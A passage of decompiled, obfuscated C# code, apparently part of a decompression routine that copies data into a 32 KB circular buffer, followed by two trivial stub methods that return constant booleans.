		if (J5IwCwpfghTToLC3MgK())
		{
		}
		int num = default(int);
		int num2 = default(int);
		switch (4)
		{
		case 4:
			num = 32768 - class34_0.int_0;
			goto case 1;
		case 1:
		case 2:
			if (int_0 > num)
			{
				num2 = Class56.smethod_56(class33_0, class34_0.byte_0, class34_0.int_0, num);
				goto default;
			}
			num2 = Class56.smethod_56(class33_0, class34_0.byte_0, class34_0.int_0, int_0);
			goto IL_00a0;
		default:
			if (num2 == num)
			{
				num2 += Class56.smethod_56(class33_0, class34_0.byte_0, 0, int_0 - num);
			}
			goto IL_00a0;
		case 3:
		case 5:
			class34_0.int_1 += num2;
			break;
		case 6:
			break;
			IL_00a0:
			class34_0.int_0 = (class34_0.int_0 + num2) & 0x7FFF;
			goto case 3;
		}
		return num2;
	}

	internal static bool eBBp0Op7wSDKHwLe0VT()
	{
		return true;
	}

	internal static bool J5IwCwpfghTToLC3MgK()
	{
		return false;
	}
}
